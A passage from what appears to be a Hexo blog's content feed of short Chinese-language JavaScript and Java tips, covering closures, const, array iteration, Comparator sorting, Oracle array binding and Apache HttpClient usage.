                &#125;
                if (ObjectUtil.isObject(webSocket)) &#123;
                    webSocket.send(this.hearbeatContent);
                &#125;
            &#125; catch (e) &#123;
                // nothing to be done
            &#125;
        &#125;, this.heartbeatTimeout);
    &#125;
&#125;;
heartCheck.start();
const connect = () =&gt; &#123;
    createWebSocket();
&#125;;
return &#123;
    connect
&#125;;
</code></pre>
<p>}());</p>
<h2 id="Object-freeze-MobileWebSocket"><a href="#Object-freeze-MobileWebSocket" class="headerlink" title="Object.freeze(MobileWebSocket);"></a>Object.freeze(MobileWebSocket);</h2>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Iterate Array Avoid Using for...in 和 for...of</title>
    <url>/posts/b9c14dcb/</url>
    <content><![CDATA[<h3 id="Iterate-Array-Avoid-Using-for…in-和-for…of"><a href="#Iterate-Array-Avoid-Using-for…in-和-for…of" class="headerlink" title="Iterate Array Avoid Using for…in 和 for…of"></a>Iterate Array Avoid Using for…in 和 for…of</h3><span id="more"></span>
<p>Iterate 陣列時避免使用for…in, for…of 因可能有非預期的值出現。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var a = []; // Create a new empty array.</span><br><span class="line">a[5] = 5;   // Perfectly legal JavaScript that resizes the array.</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (var i = 0; i &lt; a.length; i++) &#123;</span><br><span class="line">    // Iterate over numeric indexes from 0 to 5, as everyone expects.</span><br><span class="line">    console.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Will display:</span><br><span class="line">   undefined</span><br><span class="line">   undefined</span><br><span class="line">   undefined</span><br><span class="line">   undefined</span><br><span class="line">   undefined</span><br><span class="line">   5</span><br><span class="line">*/</span><br><span class="line">--------</span><br><span class="line"></span><br><span class="line">var a = [];</span><br><span class="line">a[5] = 5;</span><br><span class="line"><span class="keyword">for</span> (var x <span class="keyword">in</span> a) &#123;</span><br><span class="line">    // Shows only the explicitly <span class="built_in">set</span> index of <span class="string">&quot;5&quot;</span>, and ignores 0-4</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Will display:</span><br><span class="line">   5</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">上述用同一個Example不同<span class="keyword">for</span>方法~兩個例子會有不同的結果，且for...in是非預期的。</span><br><span class="line">因此避免使用</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>for</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript Closure建議寫法</title>
    <url>/posts/b83a0a5e/</url>
    <content><![CDATA[<h3 id="Javascript-Closure建議寫法"><a href="#Javascript-Closure建議寫法" class="headerlink" title="Javascript Closure建議寫法"></a>Javascript Closure建議寫法</h3><span id="more"></span>
<p>這篇介紹jshint、eslint建議Javascript Closure的寫法。</p>
<h3 id="Javascript-Closure-Example"><a href="#Javascript-Closure-Example" class="headerlink" title="Javascript Closure Example"></a>Javascript Closure Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const Test1 = (<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">	<span class="built_in">let</span> a = 5;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">function1</span></span>() &#123;</span><br><span class="line">		a += 1;</span><br><span class="line">		<span class="built_in">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">function2</span></span>() &#123;</span><br><span class="line">		a -= 1;</span><br><span class="line">		<span class="built_in">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> &#123;</span><br><span class="line">		function1,</span><br><span class="line">		function2,</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line">console.log(Test1.function1());</span><br><span class="line">console.log(Test1.function2());</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JSHint</tag>
        <tag>Closure</tag>
        <tag>Eslint</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript物件-對應Java靜態物件</title>
    <url>/posts/bb856232/</url>
    <content><![CDATA[<h3 id="Javascript物件-對應Java靜態物件"><a href="#Javascript物件-對應Java靜態物件" class="headerlink" title="Javascript物件-對應Java靜態物件"></a>Javascript物件-對應Java靜態物件</h3><span id="more"></span>
<p>這篇介紹Javascript物件-對應Java靜態物件。<br>Javascript的static物件，類別名稱開頭儘量用大寫，方便辨識他是一個靜態物件<br>Javascript的靜態物件通常會設計成單件，用來管理某個區塊的功能或是設計成不帶有屬性的Utils工具類別<br>private屬性跟函數使用var宣告，public屬性跟函數使用”類別名稱.xxx”宣告</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// 避免覆蓋，也可以改成如果名字已經存在的話，拋出例外    </span><br><span class="line"><span class="keyword">if</span> (typeof (Handler) == <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    Handler = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">    // private的靜態屬性</span><br><span class="line">    var privateName = <span class="string">&quot;David&quot;</span>;</span><br><span class="line"></span><br><span class="line">    // public的靜態屬性</span><br><span class="line">    Handler.publicName = <span class="string">&quot;David Chen&quot;</span>;</span><br><span class="line"></span><br><span class="line">    // private的靜態函數</span><br><span class="line">    var privateFunction = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;private function&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // public的靜態函數</span><br><span class="line">    Handler.publicFunction = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;public function&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Handler.info = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">        // 可以讀取內部private的attribute and <span class="keyword">function</span></span><br><span class="line">        console.info(privateName);</span><br><span class="line"></span><br><span class="line">        //這邊的this等同Handler物件, 所以透過this只能讀取public的attribute and <span class="keyword">function</span></span><br><span class="line">        console.info(this.publicName);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">console.info(privateName); // privateName is not defined</span><br><span class="line">console.info(Handler.publicName); // David Chen</span><br><span class="line">console.info(privateFunction()); // privateFunction is not defined</span><br><span class="line">console.info(Handler.publicFunction()); // public <span class="keyword">function</span></span><br><span class="line">Handler.info();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Static</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript架構跟開發規範</title>
    <url>/posts/7497e8f2/</url>
    <content><![CDATA[<h3 id="Javascript架構跟開發規範"><a href="#Javascript架構跟開發規範" class="headerlink" title="Javascript架構跟開發規範"></a>Javascript架構跟開發規範</h3><span id="more"></span>
<p>介紹Javascript的架構及開發規範，提供參考。</p>
<h3 id="重要原則"><a href="#重要原則" class="headerlink" title="重要原則"></a>重要原則</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. Javascript的相關程式儘量不要直接寫在jsp頁面上，請開一個獨立的js檔案放置，因為JSP會被 tomcat編譯成servlet，</span><br><span class="line">   所以相關的javascript程式碼都會被轉成字串物件並放入Tomcat的string pool裡面，並佔用到server的記憶體，而獨立的js檔案則不會有這樣的問題</span><br><span class="line"></span><br><span class="line">2. JSP的註解請儘量使用&lt;%--  --%&gt;，這種屬於server端的註解，而不是使用&lt;!--  --&gt;，這種屬於瀏覽器端的註解</span><br><span class="line">a. Server端的註解 : 並不會傳到瀏覽器端，而且不會佔用到Server的記憶體</span><br><span class="line">b. 瀏覽器端的註解 : 當檢視網頁原始碼的時候可以看到，只是不會被瀏覽器執行，但這些註解會佔用到Server端的記憶體跟耗損網站頻寬</span><br><span class="line"></span><br><span class="line">3. Javascript命名請依照Java命名，讓其他同事在閱讀時能保持一致性</span><br><span class="line"></span><br><span class="line">4. 一個頁面上如果功能複雜，請依照頁面切出功能區塊，每個功能區塊由單一Javascript物件去管控，避免混亂</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Java下OracleSQLForField_IN</title>
    <url>/posts/b3e9d258/</url>
    <content><![CDATA[<h3 id="Java下OracleSQL-For-Field-IN"><a href="#Java下OracleSQL-For-Field-IN" class="headerlink" title="Java下OracleSQL For Field_IN"></a>Java下OracleSQL For Field_IN</h3><span id="more"></span>

<h3 id="SQL指令範例"><a href="#SQL指令範例" class="headerlink" title="SQL指令範例"></a>SQL指令範例</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SELECT * FROM world <span class="built_in">where</span> position IN (SELECT /*+ CARDINALITY(T1, 100) */ * FROM TABLE(?) T1);</span><br></pre></td></tr></table></figure>

<h3 id="Oracle-Object-轉換"><a href="#Oracle-Object-轉換" class="headerlink" title="Oracle Object 轉換"></a>Oracle Object 轉換</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int[] positions = new int[2];</span><br><span class="line">positions[0] = 1;</span><br><span class="line">positions[1] = 8;</span><br><span class="line"></span><br><span class="line">OracleUtils.getOracleARRAY(conn, <span class="string">&quot;NUMBER_ARRAY&quot;</span>, positions);</span><br><span class="line"></span><br><span class="line">public static ARRAY getOracleARRAY(Connection conn, String descriptor, Object elements)</span><br><span class="line">	throws SQLException &#123;</span><br><span class="line">	Connection nativeConn = OracleUtils.getNativeConnection(conn);</span><br><span class="line">	ArrayDescriptor des = ArrayDescriptor.createDescriptor(descriptor, nativeConn);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> new ARRAY(des, nativeConn, elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="資料庫建立Type-NUMBER-ARRAY"><a href="#資料庫建立Type-NUMBER-ARRAY" class="headerlink" title="資料庫建立Type NUMBER_ARRAY"></a>資料庫建立Type NUMBER_ARRAY</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TYPE <span class="string">&quot;&#123;TABLE&#125;&quot;</span>.<span class="string">&quot;NUMBER_ARRAY&quot;</span> AS TABLE OF NUMBER;</span><br><span class="line"></span><br><span class="line">Introduction to Oracle NUMBER data <span class="built_in">type</span></span><br><span class="line">The precision is the number of digits <span class="keyword">in</span> a number. It ranges from 1 to 38. </span><br><span class="line">The scale is the number of digits to the right of the decimal point <span class="keyword">in</span> a number. It ranges from -84 to 127.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
        <tag>IN</tag>
      </tags>
  </entry>
  <entry>
    <title>Java使用Comparator做CollectionsSort</title>
    <url>/posts/d43f962c/</url>
    <content><![CDATA[<h3 id="Java使用Comparator做CollectionsSort"><a href="#Java使用Comparator做CollectionsSort" class="headerlink" title="Java使用Comparator做CollectionsSort"></a>Java使用Comparator做CollectionsSort</h3><span id="more"></span>

<p>當Server Loading較低時，可以考慮原本在SQL使用ORDER BY排序的作法，<br>改使用在該物件內@Override compare方法，並使用Collections.sort();<br>來做排序，降低資料庫Loading。</p>
<h3 id="物件範例-對Website、UserId排序"><a href="#物件範例-對Website、UserId排序" class="headerlink" title="物件範例-對Website、UserId排序"></a>物件範例-對Website、UserId排序</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class Example &#123;</span><br><span class="line">	</span><br><span class="line">	/* 避免 override compareTo 改用 comparator 比較有彈性  */</span><br><span class="line">	public final static Comparator&lt;Example&gt; websiteAndUserIdAscComparator = new Comparator&lt;Example&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		@Override</span><br><span class="line">		public int compare(Example o1, Example o2) &#123;</span><br><span class="line">			int delta = Integer.compare(o1.getWebsite(), o2.getWebsite());</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (delta != 0) &#123;</span><br><span class="line">				<span class="built_in">return</span> delta;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">return</span> o1.getUserId().compareTo(o2.getUserId());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	public final static Comparator&lt;Example&gt; websiteAscComparator = new Comparator&lt;Example&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		@Override</span><br><span class="line">		public int compare(Example o1, Example o2) &#123;</span><br><span class="line">			<span class="built_in">return</span> Integer.compare(o1.getWebsite(), o2.getWebsite());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	public final static Comparator&lt;Example&gt; userIdAscComparator = new Comparator&lt;Example&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		@Override</span><br><span class="line">		public int compare(Example o1, Example o2) &#123;</span><br><span class="line">			<span class="built_in">return</span> o1.getUserId().compareTo(o2.getUserId());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	public int website;</span><br><span class="line"></span><br><span class="line">	public String userId;</span><br><span class="line"></span><br><span class="line">	public Example(int website, String userId) &#123;</span><br><span class="line">		super();</span><br><span class="line"></span><br><span class="line">		this.website = website;</span><br><span class="line">		this.userId = userId;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public int <span class="function"><span class="title">getWebsite</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> website;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String <span class="function"><span class="title">getUserId</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> userId;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用Collections-sort排序"><a href="#使用Collections-sort排序" class="headerlink" title="使用Collections.sort排序"></a>使用Collections.sort排序</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Example&gt; lList = new ArrayList&lt;Example&gt;();</span><br><span class="line"></span><br><span class="line">lList.add(4, <span class="string">&quot;user0004&quot;</span>);       </span><br><span class="line">lList.add(1, <span class="string">&quot;user0001&quot;</span>);</span><br><span class="line">lList.add(7, <span class="string">&quot;user0007&quot;</span>);</span><br><span class="line">lList.add(2, <span class="string">&quot;user0002&quot;</span>);</span><br><span class="line">lList.add(9, <span class="string">&quot;user0009&quot;</span>);</span><br><span class="line">lList.add(1, <span class="string">&quot;user0001&quot;</span>);</span><br><span class="line">lList.add(5, <span class="string">&quot;user0005&quot;</span>);</span><br><span class="line"></span><br><span class="line">//對Website、UserId ASC排序</span><br><span class="line">Collections.<span class="built_in">sort</span>(lList, Example.websiteAndUserIdAscComparator);</span><br><span class="line">//對Website ASC排序</span><br><span class="line">Collections.<span class="built_in">sort</span>(lList, Example.websiteAscComparator);</span><br><span class="line">//對UserId ASC排序</span><br><span class="line">Collections.<span class="built_in">sort</span>(lList, Example.userIdAscComparator);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Comparator</tag>
      </tags>
  </entry>
  <entry>
    <title>Java使用RestfulApi-GET</title>
    <url>/posts/d27b077a/</url>
    <content><![CDATA[<h3 id="Java使用RestfulApi-GET"><a href="#Java使用RestfulApi-GET" class="headerlink" title="Java使用RestfulApi-GET"></a>Java使用RestfulApi-GET</h3><span id="more"></span>
<h3 id="pom-xml設定"><a href="#pom-xml設定" class="headerlink" title="pom.xml設定"></a>pom.xml設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;!-- apache http --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.5.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<h3 id="get-method"><a href="#get-method" class="headerlink" title="get method"></a>get method</h3><p>get方法，傳入uri、params、headers、retry、timeout參數。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static Optional&lt;String&gt; get(String uri, Map&lt;String, String&gt; params, List&lt;Header&gt; headers, int retry,</span><br><span class="line">	int <span class="built_in">timeout</span>) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (int i = retry; i &gt; 0; i--) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			HttpGetRequest request = ApacheHttpClientManager.getInstance().getHttpGetRequest(uri);</span><br><span class="line">			request.setParameters(params);</span><br><span class="line">			request.setHeaders(headers);</span><br><span class="line">			request.setTimeout(<span class="built_in">timeout</span>);</span><br><span class="line">			HTTPResponse httPResponse = ApacheHttpClientManager.getInstance().execute(request);</span><br><span class="line">			<span class="built_in">return</span> Optional.ofNullable(httPResponse.getContent());</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (1 == i) &#123;</span><br><span class="line">				LogUtils.error.error(e.getMessage());</span><br><span class="line">				throw e;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> Optional.empty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ApacheHttpClientManager"><a href="#ApacheHttpClientManager" class="headerlink" title="ApacheHttpClientManager"></a>ApacheHttpClientManager</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public HttpGetRequest getHttpGetRequest(String url) throws Exception &#123;</span><br><span class="line">	<span class="built_in">return</span> new HttpGetRequest(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public HTTPResponse execute(HttpGetRequest request) throws Exception &#123;</span><br><span class="line">	String url = request.getUrl();</span><br><span class="line">	<span class="keyword">if</span> (request.getQueryString() != null) &#123;</span><br><span class="line">		url = url + <span class="string">&quot;?&quot;</span> + request.getQueryString();</span><br><span class="line">	&#125;</span><br><span class="line">	Header[] headers = request.getHeaders();</span><br><span class="line">	String charset = request.getCharset();</span><br><span class="line">	<span class="keyword">if</span> (charset == null) &#123;</span><br><span class="line">		charset = DEFALUT_CHARSET;</span><br><span class="line">	&#125;</span><br><span class="line">	HttpClientContext proxyHttpContext = request.getHttpContext();</span><br><span class="line">	RequestConfig requestConfig = request.getRequestConfig();</span><br><span class="line"></span><br><span class="line">	HttpGet httpGet = new HttpGet(url);</span><br><span class="line">	httpGet.setHeader(<span class="string">&quot;Accept-Charset&quot;</span>, charset);</span><br><span class="line">	httpGet.setProtocolVersion(HttpVersion.HTTP_1_1);</span><br><span class="line">	<span class="keyword">if</span> (requestConfig != null) &#123;</span><br><span class="line">		httpGet.setConfig(requestConfig);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (headers != null) &#123;</span><br><span class="line">		httpGet.setHeaders(headers);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseableHttpResponse response = null;</span><br><span class="line">	String content = null;</span><br><span class="line">	CookieStore cookieStore = null;</span><br><span class="line">	int statusCode = 0;</span><br><span class="line">	Header[] responseHeaders;</span><br><span class="line">	try &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (proxyHttpContext != null) &#123;</span><br><span class="line">			response = httpClient.execute(httpGet, proxyHttpContext);</span><br><span class="line">			<span class="keyword">if</span> (request.receiveCookie()) &#123;</span><br><span class="line">				cookieStore = proxyHttpContext.getCookieStore();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (request.receiveCookie()) &#123;</span><br><span class="line">				HttpClientContext httpClientContext = HttpClientContext.create();</span><br><span class="line">				response = httpClient.execute(httpGet, httpClientContext);</span><br><span class="line">				cookieStore = httpClientContext.getCookieStore();</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				response = httpClient.execute(httpGet);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		responseHeaders = response.getAllHeaders();</span><br><span class="line">		statusCode = response.getStatusLine().getStatusCode();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (statusCode != 200 &amp;&amp; statusCode != 404) &#123;</span><br><span class="line">			log.info(<span class="string">&quot;HTTP Status-Code (&quot;</span> + statusCode + <span class="string">&quot;) Length w/o headers: [&quot;</span> + url.length() + <span class="string">&quot;] &quot;</span></span><br><span class="line">				+ url);</span><br><span class="line">		&#125;</span><br><span class="line">		HttpEntity entity = response.getEntity();</span><br><span class="line">		<span class="keyword">if</span> (entity != null) &#123;</span><br><span class="line">			content = getResponse(entity);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (HttpHostConnectException e) &#123;</span><br><span class="line">		log.error(e.getMessage(), e);</span><br><span class="line">		httpGet.abort();</span><br><span class="line">		HttpHost host = e.getHost();</span><br><span class="line">		PoolStats pstat = cm.getTotalStats();</span><br><span class="line">		PoolStats pst = cm.getStats(new HttpRoute(host));</span><br><span class="line">		log.info(</span><br><span class="line">			String.format(<span class="string">&quot;Total PoolStats: %s &amp; %s PoolStats: %s.&quot;</span>, pstat, host.toHostString(), pst));</span><br><span class="line">		throw e;</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		log.error(e.getMessage(), e);</span><br><span class="line">		httpGet.abort();</span><br><span class="line">		throw e;</span><br><span class="line">	&#125; finally &#123;</span><br><span class="line">		close(response);</span><br><span class="line">		<span class="keyword">if</span> (httpGet != null) &#123;</span><br><span class="line">			httpGet.releaseConnection();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (isTrace) &#123;</span><br><span class="line">		log.info(<span class="string">&quot;HttpGet content:&quot;</span> + content);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> new HTTPResponse(statusCode, content, responseHeaders,</span><br><span class="line">		(cookieStore == null ? null : cookieStore.getCookies()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>GET</tag>
        <tag>RestfulApi</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的HttpClient關閉cookie支援</title>
    <url>/posts/4b11a6d6/</url>
    <content><![CDATA[<h3 id="Java在HttpClient關閉cookie支援"><a href="#Java在HttpClient關閉cookie支援" class="headerlink" title="Java在HttpClient關閉cookie支援"></a>Java在HttpClient關閉cookie支援</h3><span id="more"></span>
<p>通常在API Server不需要使用cookie，這篇介紹如何在Java的HttpClient關閉cookie支援。</p>
<h3 id="在initial將cookie資源管理disable"><a href="#在initial將cookie資源管理disable" class="headerlink" title="在initial將cookie資源管理disable"></a>在initial將cookie資源管理disable</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//API連線不需要使用cookie，因此關閉cookie管理，降低系統資源耗用。</span><br><span class="line">//主要是.disableCookieManagement() 和 .disableAutomaticRetries() 來關閉cookie管理。</span><br><span class="line"></span><br><span class="line">private CloseableHttpClient httpClient = null;</span><br><span class="line"></span><br><span class="line">protected RequestConfig requestConfig = null;</span><br><span class="line"></span><br><span class="line">requestConfig = RequestConfig.custom().setSocketTimeout(SOCKET_HOLD_TIMEOUT)</span><br><span class="line">	.setConnectTimeout(CONNECTION_TIMEOUT).setConnectionRequestTimeout(CONNECTION_REQUEST_TIMEOUT)</span><br><span class="line">	.build();</span><br><span class="line">httpClient = HttpClients.custom().setConnectionManager(cm).setKeepAliveStrategy(keepAliveStrategy)</span><br><span class="line">	.setDefaultRequestConfig(requestConfig).disableCookieManagement()</span><br><span class="line">	.setUserAgent(</span><br><span class="line">		<span class="string">&quot;mozilla/4.0 (compatible; msie 8.0; windows nt 6.1; wow64; trident/4.0; slcc2; .net clr 2.0.50727; .net clr 3.5.30729; .net clr 3.0.30729; media center pc 6.0; masn)&quot;</span>)</span><br><span class="line">	.disableAutomaticRetries().build();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>Java在int[]使用binarySearch</title>
    <url>/posts/b42c1036/</url>
    <content><![CDATA[<h3 id="Java在int-使用binarySearch"><a href="#Java在int-使用binarySearch" class="headerlink" title="Java在int[]使用binarySearch"></a>Java在int[]使用binarySearch</h3><span id="more"></span>
<p>此範例是在for迴圈裡，將兩個int[]來做比對。<br>要注意使用Arrays.binarySearch()前必須要先執行Arrays.sort()，<br>沒有sort的話，會發生找不到值的情形發生。<br>此寫法會比用Collection提供了stream()方法效率高。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int[] compareIntegerArray = &#123;6,7,8,10,9&#125;;</span><br><span class="line">int[] integerArray = &#123;1,2,3,5,4&#125;;</span><br><span class="line"></span><br><span class="line">// binarySearch 必須排序!!!</span><br><span class="line">Arrays.<span class="built_in">sort</span>(integerArray);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (int value : compareIntegerArray) &#123;</span><br><span class="line">	String setValue = (Arrays.binarySearch(integerArray, value) &gt;= 0) ? <span class="string">&quot;true&quot;</span> : <span class="string">&quot;false&quot;</span>;</span><br><span class="line">	//將setValue執行資料庫動作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Array</tag>
        <tag>binarySearch</tag>
      </tags>
  </entry>
  <entry>
    <title>JaveScript-ES6-const</title>
    <url>/posts/e2676926/</url>
    <content><![CDATA[<h3 id="JaveScript-ES6-const"><a href="#JaveScript-ES6-const" class="headerlink" title="JaveScript-ES6-const"></a>JaveScript-ES6-const</h3><span id="more"></span>
<p>const用來宣告常數變數，一旦宣告就無法改變。</p>
<h3 id="const-一旦宣告就無法改變"><a href="#const-一旦宣告就無法改變" class="headerlink" title="const-一旦宣告就無法改變"></a>const-一旦宣告就無法改變</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const PI = 3.1415;</span><br><span class="line">PI // 3.1415</span><br><span class="line"></span><br><span class="line">PI = 3;</span><br><span class="line">// TypeError: Assignment to constant variable.</span><br></pre></td></tr></table></figure>

<h3 id="const一旦宣告，必須賦予初始值"><a href="#const一旦宣告，必須賦予初始值" class="headerlink" title="const一旦宣告，必須賦予初始值"></a>const一旦宣告，必須賦予初始值</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const foo;</span><br><span class="line">// SyntaxError: Missing initializer <span class="keyword">in</span> const declaration</span><br></pre></td></tr></table></figure>

<h3 id="只在宣告的區塊內有效"><a href="#只在宣告的區塊內有效" class="headerlink" title="只在宣告的區塊內有效"></a>只在宣告的區塊內有效</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  const MAX = 5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAX // Uncaught ReferenceError: MAX is not defined</span><br></pre></td></tr></table></figure>

<h3 id="const只能在宣告後使用"><a href="#const只能在宣告後使用" class="headerlink" title="const只能在宣告後使用"></a>const只能在宣告後使用</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  console.log(MAX); // ReferenceError</span><br><span class="line">  const MAX = 5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="不可重複宣告"><a href="#不可重複宣告" class="headerlink" title="不可重複宣告"></a>不可重複宣告</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var message = <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line"><span class="built_in">let</span> age = 25;</span><br><span class="line"></span><br><span class="line">// 以下兩行都error</span><br><span class="line">const message = <span class="string">&quot;Goodbye!&quot;</span>;</span><br><span class="line">const age = 30;</span><br></pre></td></tr></table></figure>

<h3 id="const不能改變記憶體位址"><a href="#const不能改變記憶體位址" class="headerlink" title="const不能改變記憶體位址"></a>const不能改變記憶體位址</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const foo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// 可以在 foo 增加屬性</span><br><span class="line">foo.prop = 123;</span><br><span class="line">foo.prop // 123</span><br><span class="line"></span><br><span class="line">// 将 foo 指向 &#123; &#125;，error</span><br><span class="line">foo = &#123;&#125;; // TypeError: <span class="string">&quot;foo&quot;</span> is read-only</span><br><span class="line">-------------------------------------------</span><br><span class="line">const a = [];</span><br><span class="line">a.push(<span class="string">&#x27;Hello&#x27;</span>); // ok</span><br><span class="line">a.length = 0;    // ok</span><br><span class="line">a = [<span class="string">&#x27;Dave&#x27;</span>];    // error</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>const</tag>
      </tags>
